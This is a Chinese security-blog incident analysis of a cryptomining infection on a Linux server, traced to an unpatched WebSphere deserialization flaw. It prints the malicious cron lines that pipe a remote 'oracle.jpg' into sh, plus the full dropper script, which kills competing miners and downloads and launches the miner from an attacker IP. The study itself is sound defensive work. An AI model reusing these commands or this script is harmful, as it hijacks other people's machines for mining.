***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 ***本文原创作者：cgf99，本文属FreeBuf原创奖励计划，未经许可禁止转载**  

## 一、背景

**近期，客户向华屹安全团队通报其服务器运行异常。经过安全技术人员的检查，发现了这是一例典型的利用Linux服务器漏洞实施XMR挖矿的安全事件。当前网络安全事件中黑客利用系统漏洞实施挖矿的事件频见报道，而本团队在实际工作中却头回遇见，因此对该样本实施了具体分析。**

## 二、技术具体分析

### 1、主机环境为Linux

### 2、发现一异常进程，其运行情况为：

./kswapd0 -c ksvjptcyah.cf -t 2

连接的端口是148.251.133.246的80。

利用IP查询，发现其是德国的服务器。具体如下图所示：

![图片.png](https://image.3001.net/images/20180315/15210772795200.png!small)  

直接用浏览器访问，其返回的是mining server online，如下图所示，由此可见该服务器应该是一台矿池服务器。

![图片.png](https://image.3001.net/images/20180315/15210772894286.png!small)  

还发现，该服务器还开放5555端口（返回和80端口一致）、8080端口。用浏览器直接访问8080端口，发现其是electroneum矿池。其主页返回如下图所示：

![图片.png](https://image.3001.net/images/20180315/15210773012791.png!small)  

###
3、发现进程kswapd0位于/var/tmp目录下，该目录下同时还存放ksvjptcyah.cf文件。其中ksvjptcyah.cf文件的内容如下所示：

ksvjptcyah.cf内容

    
    
    {
    
       "url" : "stratum+tcp://148.251.133.246:80",
    
       "user" :"etnkN7n6nSXjPNxVjFFqjaCHdaXBHR2q3cWUnd5ZEtnvAVKKYRrucRgF34XdY2cMfAEUsTrUFJNGvgK4q2dQFfsY41pihj9PMc",
    
       "pass" : "x",
    
       "algo" : "cryptonight",
    
       "quiet" : true
    
    }

显然，这是挖矿程序的配置文件。

其中矿池地址为：148.251.133.246:80

挖矿帐号为：etnkN7n6nSXjPNxVjFFqjaCHdaXBHR2q3cWUnd5ZEtnvAVKKYRrucRgF34XdY2cMfAEUsTrUFJNGvgK4q2dQFfsY41pihj9PMc

Quiet表示在后台安静的挖矿。

在该矿池的界面，通过搜索发现该帐号挖矿的具体情况如下图所示：

![图片.png](https://image.3001.net/images/20180315/15210773164278.png!small)  

如上图所示，挖的是ETN币。每秒的hash rate为159.45KH。说明该病毒至少感染了成百上千台了（如果假设一台主机60-1000H/S的情况）。

### 4、利用kill杀掉kswapd0进程。

过一会发现，又出来相同异常进程，进程会变化，

./ Ksvjptcyah -c Ksvjptcyah .cf -t 2。

### 5、查找其启动方式，根据以往经验，一般病毒会利用定时任务启动。

果然，发现启动任务如下：

    
    
    */29 * * * * wget -O - -q<http://181.214.87.241/java/oracle.jpg>|sh
    
    */30 * * * * curl<http://181.214.87.241/java/oracle.jpg>|sh

利用ip138查询，发现181.214.87.241是一台位于美国或者智利的机器。查询结果如下图所示：

![图片.png](https://image.3001.net/images/20180315/15210773337620.png!small)  

对其直接利用浏览器访问，现实的是apache ubuntu 缺省页面。如下图所示：

![图片.png](https://image.3001.net/images/20180315/15210773457881.png!small)  

浏览器直接访问<http://181.214.87.241/java/oracle.jpg>，显示该图片因错误无法显示，结果如下图所示：

![图片.png](https://image.3001.net/images/20180315/15210773566935.png!small)  

用curl直接下载回本地，发现其内容如下：

oracle.jpg的内容：

    
    
    id1="adcixstgtf"
    
    id2="ksvjptcyah"
    
    id3="kswapd0"
    
    rm -rf /var/tmp/vmstat
    
    rm -rf /var/tmp/`echo $id1`.conf
    
    ps auxf|grep -v grep|grep -v `echo$id2`|grep "/tmp/"|awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep "\-px"|awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep"stratum"|awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep"cryptonight"|awk '{print $2}'|xargs kill -9
    
    ps auxf|grep -v grep|grep `echo$id1`|awk '{print $2}'|xargs kill -9
    
    ps -fe|grep `echo $id2`|grep -v grep
    
    if [ $? -ne 0 ]
    
    then
    
    echo "start process....."
    
    chmod 777 /var/tmp/`echo $id2`.cf
    
    rm -rf /var/tmp/`echo $id2`.cf
    
    curl -o /var/tmp/`echo $id2`.cfhttp://181.214.87.241/java/`echo $id3`.cf
    
    wget -O /var/tmp/`echo $id2`.cfhttp://181.214.87.241/java/`echo $id3`.cf
    
    chmod 777 /var/tmp/`echo $id3`
    
    rm -rf /var/tmp/`echo $id3`
    
    cat /proc/cpuinfo|grep aes>/dev/null
    
    if [ $? -ne 1 ]
    
    then
    
    curl -o /var/tmp/`echo $id3`http://181.214.87.241/java/`echo $id3`
    
    wget -O /var/tmp/`echo $id3`http://181.214.87.241/java/`echo $id3`
    
    else
    
    curl -o /var/tmp/`echo $id3`http://181.214.87.241/java/`echo $id3`_an
    
    wget -O /var/tmp/`echo $id3`http://181.214.87.241/java/`echo $id3`_an
    
    fi
    
    chmod +x /var/tmp/`echo $id3`
    
    cd /var/tmp
    
    proc=`grep -c ^processor /proc/cpuinfo`
    
    cores=$((($proc+1)/2))
    
    ./`echo $id3` -c `echo $id2`.cf -t `echo$cores` >/dev/null &
    
    else
    
    echo "Running....."
    
    fi

通过分析该sh脚本，发现该程序首先分析本地机器是否已经存在其他的挖矿软件，如果存在就先杀掉。（当我财路者格杀勿论…）

然后从181.214.87.241服务器下载配置文件和挖矿程序。

黑客还判断其cpu
情况，cores=$((($proc+1)/2))说明黑客只利用了主机一半多的CPU资源用于挖矿，给机器主人留下一点可用的资源（粗心的机器主人没有反应…，你好我也好…）。

### 6、服务器如何被感染的？

安全技术人员通过对该服务器的再次分析，发现其websphere软件没有补丁，黑客是利用该软件的java 反序列漏洞直接控制本服务器。

 ***本文原创作者：cgf99，本文属FreeBuf原创奖励计划，未经许可禁止转载**

